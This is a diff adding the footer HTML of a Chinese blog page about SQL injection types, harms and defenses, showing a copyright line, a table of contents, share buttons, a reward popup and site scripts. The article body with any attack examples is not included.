+        <span>文章原始路径：<a href="https://github.com/WeiyiGeek/blog/edit/master/source/_posts/网安大类/OWASPTOP/SQLInject/SQL注入类型危害及防御.md" target="_blank" rel="noopener noreferrer">_posts/网安大类/OWASPTOP/SQLInject/SQL注入类型危害及防御.md</a></span><br>
+         <span class="copy-copyright">转载注明出处，原文地址：<a href="/2019/3-28-384.html" target="_blank" rel="external">https://blog.weiyigeek.top/2019/3-28-384.html</a></span><br>本站文章内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a> 
+    </div>
+    <footer>
+      <a href="https://blog.weiyigeek.top">
+        <img src="/img/avatar.jpg" alt="WeiyiGeek">
+        WeiyiGeek
+      </a>
+    </footer>
+  </blockquote>
+
+
+        
+            <div class="page-reward">
+  <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-rectangle waves-light">👍 钟意作者</a>
+</div>
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/3-28-384.html&title=《SQL注入类型危害及防御》 — WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/3-28-384.html&title=《SQL注入类型危害及防御》 — WeiyiGeek Blog&source=注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击, 请勿恶意使用下面描述技术进行非法操作。
+[TOC]" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/3-28-384.html" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SQL注入类型危害及防御》 — WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/3-28-384.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/3-28-384.html" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+          <!-- 评论组件 -->
+
+
+<div id="gitalk-container"></div>
+<script type="text/javascript" src="/js/plugins/gitalk.min.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/custom/gitalk.init.js?v=1.6.6"></script>
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/3-29-334.html" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">3.Python3基础入门学习笔记(三)</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/3-28-138.html" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Linux安全运维数据恢复操作</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x00-前言简述"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 前言简述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x00-的危害与防御"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x00 的危害与防御</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x01-SQL注入漏洞的分类"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x01 SQL注入漏洞的分类</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x03-SQL白盒与黑盒测试方法"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x03 SQL白盒与黑盒测试方法</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x04-SQL监测和防御这类漏洞"><span class="post-toc-number">5.</span> <span class="post-toc-text">0x04 SQL监测和防御这类漏洞</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+  <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        人间自有五大情【点赞、投币(赞赏)、收藏、关注，转发】, 谢谢看友支持!
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardwechat" src="/img/reward-wechat.jpg" height="228" height="228" alt="打赏二维码">
+            <img id="rewardalipay" src="/img/reward-alipay.png" height="228" height="228" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <!-- <input id="rewardToggle" type="checkbox" class="reward-toggle-check" data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.png"> -->
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+  
+ <!-- 微信公众号关注/文章版权复制 -->
+
+  <div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0); display:none"></div>
+<div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 360px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;display:none">
+<span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 1.8; font-size: 15px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">X</span>
+<p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px; ">
+<b style="color:#6190e8;">你好朋友,可以关个注吗? ❤ <br> 这将是我持续更新文章的动力源泉，谢谢支持！(๑′ᴗ‵๑) </b> <br> 如不想关注请点击右上角的【X】<br>
+<br>Method 1.Please visit <strong><a href="https://twitter.com/WeiyiGeek" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">【My Twitter】</a></strong>. There is an article verification code in the homepage.
+<br>方式2.请访问本博主的B站<strong><a href="https://space.bilibili.com/385802642" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">【WeiyiGeek】</a></strong>首页关注UP主,<br>将自动随机获取解锁验证码。
+<br>方式3.扫一扫下方二维码，关注本站<strong>官方公众号</strong><br>
+回复：<strong style="color: rgb(240, 65, 52);">验证码</strong>
+将获取<strong style="color: rgb(240, 65, 52);">解锁(有效期7天)</strong>本站所有技术文章哟!</p>
+<img src="/img/wechat-search.png" style="width: 300px; margin-top: 10px;">
+<div id="btw-modal-input-code" style="margin-top: 20px; background: rgb(255, 255, 255);">
+  <input id="btw-modal-input" type="number" minlength="4" maxlength="4" placeholder="请输入验证码|Verification Code"
+    style="width: 165px; height: 32px; line-height: 32px; padding: 0px 10px; margin: 0px 10px; font-size: 13px; text-rendering: auto; text-transform: none; cursor: text; outline: none; box-sizing: border-box; border: 1px solid rgb(221, 221, 221); -webkit-appearance: textfield; background-color: white; -webkit-rtl-ordering: logical;"/>
+  <button id="btw-submit-btn" onclick="yzm_vertify()"
+    style="padding: 0px 20px; height: 32px; font-size: 14px; outline: none; border: none; color: rgb(255, 255, 255); background: rgb(222, 104, 109); cursor: pointer;">提
+    交</button> </div>
+<p id="btw-footer" style="margin: 40px 0px 20px; color: rgb(153, 153, 153);">@WeiyiGeek - 为了能到远方，脚下的每一步都不能少</p>
+</div>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://weiyigeek.top" target="_blank">https://weiyigeek.top</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.weiyigeek.top" target="_blank">https://blog.weiyigeek.top</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank">公众账号</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://space.bilibili.com/385802642/article" target="_blank">哔哩哔哩专栏</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://github.com/weiyigeek" target="_blank">个人Github</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://gitee.com/WeiyiGeek" target="_blank">个人Gitee</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.zhihu.com/people/weiyiSec" target="_blank">个人知乎</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.cnblogs.com/WeiyiGeek" target="_blank">博客园</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://my.oschina.net/weiyigeek" target="_blank">OSCHINA</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.toutiao.com/c/user/token/MS4wLjABAAAAqcPSoMqfctaEqJpGSF775eeCjWkrop4AOyLITdMx-L78F5iXzfQcSRM5sY4dq3wR" target="_blank">今日头条</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.csdn.net/u013072756?type=lately" target="_blank">CSDN</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.jianshu.com/u/5199a1104739" target="_blank">简书</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://cloud.tencent.com/developer/user/1389665/articles" target="_blank">腾讯云+云社区</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://cuttlefish.baidu.com/shop/75c5dbd8d15abe23482f4d40" target="_blank">百度文库</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://author.baidu.com/home?from=blog&app_id=1726736601523415" target="_blank">IT极客知识分享</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.51cto.com/weiyigeek" target="_blank">51CTO博客</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://juejin.cn/user/122767337595934" target="_blank">掘金</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://weibo.com/a/hot/7622022703618049_1.html" target="_blank">微博文章</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.xiaohongshu.com/user/profile/627c98bb000000001000e7ba" target="_blank">小红书</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://segmentfault.com/u/weiyigeek" target="_blank">Segmentfault</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.douyin.com/user/MS4wLjABAAAAMSBdMja6XLsdmzafb0RNbFeBemIOk38K1PaOClZeI1Q" target="_blank">抖音主页</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+      <p>
+        <span>WeiyiGeek &copy; 2018 - 2022 <a href="https://weiyigeek.top" target="_blank" rel="noopener">weiyigeek.top</a> All rights reserved. IT唯一极客 版权所有 </span>
+        
+        <span>
+          Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/weiyigeek" target="_blank">mellow</a>
+        </span>
+        
+        <br/>访问统计
+        <span><a href="/sitemap.xml" target="_blank" rel="Sitemaps-站点地图">Sitemaps</a> </span>
+        <span><a href="/baidusitemap.xml" target="_blank" rel="baidusitemaps-百度站点地图">站点地图</a> </span>
+        <!-- 
+  -->
+        <br/>ICP备案号<span><a href="https://beian.miit.gov.cn" target="_blank">渝ICP备2022003447号</a></span>
+        <br/>
+        <div id="cc-myssl-id">
+          <a href="https://myssl.com/blog.weiyigeek.top?from=mysslid" target="_blank" rel="noopener"><img src="https://static.myssl.com/res/images/myssl-id1.png" alt="MySSL安全认证" style="max-height:50px;display:block;margin:0 auto"></a>
+        </div>
+      </p>
+    </div>
+</footer>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/3-28-384.html&title=《SQL注入类型危害及防御》 — WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/3-28-384.html&title=《SQL注入类型危害及防御》 — WeiyiGeek Blog&source=注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击, 请勿恶意使用下面描述技术进行非法操作。
+[TOC]" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/3-28-384.html" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SQL注入类型危害及防御》 — WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/3-28-384.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/3-28-384.html" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACH0lEQVR42u3aQY7CMAwFUO5/aeYAo5Zvm8yoyesKQRXysrBsx69X/Lwvnt+/Xr1/tebVv7xWPBgYGI9lvG+f3jv339yTqv+LgYFxDiNf+j7W5WH6ftP53jAwMDCSNO67IRgDAwNjzigsHQflfwi4GBgYD2QkoTN5P2+0Je25JbU4BgbGAxl51/3vPy+538DAwHgUoxc6e5/zxLG8KwwMjK0ZeYCbNPfzgra3HwwMjBMY8zK1N+CVHEr+DQYGxq6MPIyWT6XY9O+loZcZLgYGxkaMai8rSePmQ2BfuADAwMDYiJEPN1SHM3JYHnwvf8XAwNiakQfN6hBGsnJ+eRkdNAYGxjGMdbMbvcuAvEjGwMDYlVFtclUrx/sytYosdw0xMDA2YuRJ2KSrl6eY1ePDwMA4k9Fr1lcHMvKLyQ+HhYGBsTWj2tjKw+WKNQvDFhgYGNsxqoVoNa3Mk8jRtAgGBsbWjGqAuw+R+Tv5v3wh28XAwHg4oxo6qyG1mvxVRzQwMDDOYcwDZXW1aoPvAwYDA+Mwxop2f6+QLlxzYmBgHMCYtPjnQXbST8PAwNib8S4+VcC3DuXDcWNgYGzNqIa5SUMtH9GYN/gwMDD2Y6xL7PKSuDdygYGBcRqjV9zmmMKGeqthYGBgBJtIRrjycje52sTAwMCYl6NVao+EgYFxDiMfC0sC6zy8Lmy3YWBgPJAxmdSYk3pNuuZFJgYGxvMYPxstapjUtz/qAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="/js/jquery/2.1.0-jquery.min.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/jquery/3.5.2-jquery.fancybox.min.js?v=1.6.6"></script>
+<!--  //cdn.bootcss.com/node-waves/0.7.4/waves.min.js -->
+<script type="text/javascript" src="/js/node-waves/0.7.4-waves.min.js?v=1.6.6"></script> 
+
+<script type="text/javascript" src="/js/method.js?v=1.6.6"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.6.6"></script>
+
+<!-- third-party -->
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.6.6"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) { search_path = "search.xml";}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script> 
+
+<!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> --> 
+
+
+
+  
+
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    // 百度统计
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?53923c4b5560739bc0ed61e183be6acf";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+ 
+
+
+<!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.staticfile.org/mathjax/2.7.9/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+<script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = 'WeiyiGeek Blog-关注于网络安全_物联网安全开发_网络安全运维-学习心得分享';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+ 
+     <script type="text/javascript" src="/js/custom/copytips.js?v=1.6.6"></script> 
+</body>
+</html>
